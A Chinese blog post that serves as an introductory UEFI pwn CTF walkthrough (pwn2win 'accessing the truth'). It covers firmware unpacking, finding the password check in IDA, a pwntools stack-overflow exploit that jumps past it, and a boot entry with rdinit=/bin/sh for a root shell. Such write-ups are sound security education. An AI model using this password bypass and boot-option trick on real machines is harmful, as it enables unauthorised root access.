---
layout: post
title: UEFI pwn初探
category: system/multiarch
date: 2024-7-18 13:00:00
---
UEFI pwn初探

[toc]

# UEFI PWN

## 0x00. 工具安装

安装`binwalk`：

```bash
sudo apt install binwalk
```

安装`uefi-firnware-parser`：

```bash
pip install uefi_firmware
```

在`Windows`上安装`UEFITool`:

[链接](https://github.com/LongSoft/UEFITool/releases/download/A68/UEFITool_NE_A68_win64.zip)

为`ida`安装插件`find-crypt`：

[地址](https://github.com/polymorf/findcrypt-yara)

其中，需要为`ida`的`python`安装库，如下所示：

```bash
pip install yara-python
```

将下载后的文件内的`.ruls .py`文件放入`ida`的`plugins`文件即可。

安装`winchecksec`，[链接](https://github.com/trailofbits/winchecksec/releases)，可以选择置入`Ubuntu`的可执行文件目录。

## 0x01. 基本流程

下载题目文件，一般会给一个`*.fd`文件，和一个`*.py`的启动脚本，以及用于启动`qemu`的`bz-Image`、`*.cpio`打包的文件目录等。

可以先观察启动脚本，修改里面的一些信息例如`timeout`等信息，便于我们进行调试。

### 解包文件目录

一样的

```bash
mdkir core
cp ./initramfs.cpio core
cd core
cpio -idmv < ./initramfs.cpio
```

随后可以观察一下解包出来的`init`启动脚本，例如本测试题目有如下信息表明这是一个`UEFI Pwn`：

```bash
mount -t efivarfs efivarfs /sys/firmware/efi/efivars
```

### 查看固件信息

可以通过多种方式，例如：

- 第一步下载的`UEFI Tool`，可以用图形界面来打开`OVMF.fd`。
- 利用`binwalk -Me ./OVMF.fd`来查看固件信息。

### 解压固件

可以通过`UEFI-FIRMWARE-PARSER`解压固件，如下所示：

```bash
uefi-firmware-parser -ecO ./OVMF.fd
```

### 定位UIAPP

启动时按下`F12`，可以进入`BIOS`，如下本题是一个输入密码验证的程序，不同的程序有所区别：

![image-20240516160622487](https://ltfallpics.oss-cn-hangzhou.aliyuncs.com/images/202405161606519.png)

图上还显示了一些信息，例如`7CB8*`，和`462CAA*`。

在`bash`中搜索两个文件，如下所示：

```bash
$ find ./* -name '*462c*'
./OVMF.fd_output/volume-0/file-9e21fd93-9c72-4c15-8c4b-e77f1db2d792/section0/section3/volume-ee4e5898-3914-4259-9d6e-dc7bd79403cf/file-462caa21-7614-4503-836e-8ab6f4662331
```

可以看到找到了和图中一模一样的文件夹，其中含有如下文件：

```bashj
$ ls
file.obj    section1.raw   section3.version    section0.pe   section2.ui
```

而其中，我们使用`ida`打开`section0.pe`文件，按下`shift+f12`，查找字符串。

查找我们刚刚在`bios`中看到的字符串，例如`Enter Password`。若没有找到，右键空白处，点击`Setup`。

选择`Unicode C-style(16bits)`或者其他选项，如图所示：

![image-20240516161224812](https://ltfallpics.oss-cn-hangzhou.aliyuncs.com/images/202405161612867.png)

选中之后我即找到了`Enter Password`字符串。交叉引用，找到`main`函数：

![image-20240516161307779](https://ltfallpics.oss-cn-hangzhou.aliyuncs.com/images/202405161613838.png)

### 确认程序基地址

通过`winchecksec`查询程序保护机制。如下所示：

![image-20240516203846098](https://ltfallpics.oss-cn-hangzhou.aliyuncs.com/images/202405162038192.png)

可见这里是没有开启`elf`中类似于`PIE`的保护机制的，因此我们可以直接确定整个程序的基地址。

通过如下脚本来通过`qemu`启动`bios`，注意我们添加了`-s`参数以便我们挂载：

注意，若要复用该脚本，需要注意更改`qemu`启动选项。

```python
from pwn import *

context.arch = "amd64"
context.log_level = "debug"

tube.s = tube.send
tube.sl = tube.sendline
tube.sa = tube.sendafter
tube.sla = tube.sendlineafter
tube.r = tube.recv
tube.ru = tube.recvuntil
tube.rl = tube.recvline
tube.ra = tube.recvall
tube.rr = tube.recvregex
tube.irt = tube.interactive

DEBUG = 1

if DEBUG == 0:
    fname = "/tmp/test_uefi"
    os.system("cp OVMF.fd %s" % (fname))
    os.system("chmod u+w %s" % (fname))

    p = process(["qemu-system-x86_64", "-m", "64M", "-drive", "if=pflash,format=raw,file="+fname, "-drive",
                    "file=fat:rw:contents,format=raw", "-net", "none", "-nographic"], env={})
elif DEBUG == 1:
    fname = "/tmp/test_uefi"
    os.system("cp OVMF.fd %s" % (fname))
    os.system("chmod u+w %s" % (fname))

    p = process(["qemu-system-x86_64", "-s", "-m", "64M", "-drive", "if=pflash,format=raw,file="+fname, "-drive",
                    "file=fat:rw:contents,format=raw", "-net", "none", "-nographic"], env={})
elif DEBUG == 2:
    p = remote('accessing-the-truth.pwn2win.party', 1337)

def exploit():
    p.recvn(1)
    # sleep(1)
    p.send("\x1b[24~")

    p.irt()

if __name__ == "__main__":
    exploit()
```

通过上面的脚本运行该程序，并新开一个`shell`来运行`gdb`，通过如下命令来连接到`qemu`:

```bash
target remote:1234
```

随后，我们只需要通过一个字符串的地址，即可确定整个程序的基地址。

在`ida`中，根据字符串的地址来找到其位于`Hex View`中的位置，如下所示：

![image-20240516204405902](https://ltfallpics.oss-cn-hangzhou.aliyuncs.com/images/202405162044932.png)

选中后，右键点击`Convert->Convert to hex string`，即可在`ida`输出框中获得字符串内容的十六机制表示：

![image-20240516204524171](https://ltfallpics.oss-cn-hangzhou.aliyuncs.com/images/202405162045199.png)

随后，在`gdb`连接到的`qemu`中，通过`search -x`搜索该字符串：

![image-20240516204807712](https://ltfallpics.oss-cn-hangzhou.aliyuncs.com/images/202405162048748.png)

如上所示，我们找到了该字符串的三处出现位置。然而，我们在`ida`中观察到字符串的地址为`0x13990`，这意味着字符串地址以`0x90`结尾，因此`0x28ba990`即为字符串真实地址。

因此，简单计算即可得出程序的真实基地址：

![image-20240516205049827](https://ltfallpics.oss-cn-hangzhou.aliyuncs.com/images/202405162050866.png)

通过该真实地址比对`main`函数处代码，确认即可。

随后即可修改`IDA`的基地址，`ida`中点击左上角`edit -> Segments -> Rebase Program`，输入程序基地址即可。

### 漏洞利用

这一部分反而对于每个题目是不一样的，此处不再赘述。

基于本篇内容的题目是一个栈溢出，那么溢出到哪里呢？

![image-20240517101846199](https://ltfallpics.oss-cn-hangzhou.aliyuncs.com/images/202405171018293.png)

可以观察到`main`函数内会根据比对密码是否成功返回`1`或者`0`。

因此，我们交叉引用`main`函数，如下所示：

![image-20240517101945324](https://ltfallpics.oss-cn-hangzhou.aliyuncs.com/images/202405171019369.png)

可以看到若`main`函数返回为真，则会进入该`if`语句。因此我们查看其地址：

![image-20240517102056337](https://ltfallpics.oss-cn-hangzhou.aliyuncs.com/images/202405171020382.png)

只要`main`函数为真，我们进入该`if`语句即可。因此，溢出后的地址我们选择`0x28b0dd5`，就相当于后门地址。

因此`exp`如下：

```python
from pwn import *

context.arch = "amd64"
# context.log_level = "debug"

tube.s = tube.send
tube.sl = tube.sendline
tube.sa = tube.sendafter
tube.sla = tube.sendlineafter
tube.r = tube.recv
tube.ru = tube.recvuntil
tube.rl = tube.recvline
tube.ra = tube.recvall
tube.rr = tube.recvregex
tube.irt = tube.interactive

DEBUG = 0

if DEBUG == 0:
    fname = "/tmp/test_uefi"
    os.system("cp OVMF.fd %s" % (fname))
    os.system("chmod u+w %s" % (fname))

    p = process(["qemu-system-x86_64", "-m", "64M", "-drive", "if=pflash,format=raw,file="+fname, "-drive",
                    "file=fat:rw:contents,format=raw", "-net", "none", "-nographic"], env={})
elif DEBUG == 1:
    fname = "/tmp/test_uefi"
    os.system("cp OVMF.fd %s" % (fname))
    os.system("chmod u+w %s" % (fname))

    p = process(["qemu-system-x86_64", "-s", "-m", "64M", "-drive", "if=pflash,format=raw,file="+fname, "-drive",
                    "file=fat:rw:contents,format=raw", "-net", "none", "-nographic"], env={})
elif DEBUG == 2:
    p = remote('accessing-the-truth.pwn2win.party', 1337)

def exploit():
    p.recvn(1)
    # sleep(1)
    p.send("\x1b[24~")
    payload = b'\n'*0xa8 + p32(0x28b0dd5)
    payload += b'\r'

    #pause()
    p.sa('Password', payload)

    payload = '\r'
    p.s(payload)
    p.s(payload)

    p.irt()

if __name__ == "__main__":
    exploit()
```

### 进入BIOS并添加启动项

运行上述脚本。但是上述脚本不能直接运行，因为`pwntools`对图形界面的支持不够好。

因此，我们通过如下命令来通过`socat`挂载该程序：

```bash
socat -,raw,echo=0 SYSTEM:"python3 ./exp.py"
```

此时即可进入`BIOS`。

如图所示：

![image-20240517102556611](https://ltfallpics.oss-cn-hangzhou.aliyuncs.com/images/202405171025665.png)

我们选择英语，进入`BOOT Maintenance Manager`：

![image-20240517102623282](https://ltfallpics.oss-cn-hangzhou.aliyuncs.com/images/202405171026326.png)

继续，选择`Boot Options`：

![image-20240517102644823](https://ltfallpics.oss-cn-hangzhou.aliyuncs.com/images/202405171026869.png)

选择`Add Boot Option`:

![image-20240517102812911](https://ltfallpics.oss-cn-hangzhou.aliyuncs.com/images/202405171028954.png)

选中唯一的选项即可，继续：

![image-20240517102839779](https://ltfallpics.oss-cn-hangzhou.aliyuncs.com/images/202405171028823.png)

选择`bzImage`：

![image-20240517103042801](https://ltfallpics.oss-cn-hangzhou.aliyuncs.com/images/202405171030843.png)

在`Input the description`中输入`rootshell`，随后在`Input the Optional Data`中输入如下内容：

```bash
console=ttyS0 initrd=initramfs.cpio rdinit=/bin/sh quiet
```

注意，`initrd`的参数的`cpio`文件是文件系统，一定要放在`contents`目录下，这是`BIOS`默认寻找的文件夹。

若不知道这里该填什么，可以看题目给的`boot.nsh`文件，添加上`rdinit=/bin/sh`即可。

随后保存即可，回到最开始的界面：

![image-20240517103223480](https://ltfallpics.oss-cn-hangzhou.aliyuncs.com/images/202405171032536.png)

选择`Boot Manager`：

![image-20240517103239383](https://ltfallpics.oss-cn-hangzhou.aliyuncs.com/images/202405171032429.png)

选中我们刚刚创建的启动项，即可以`root`权限进入系统。
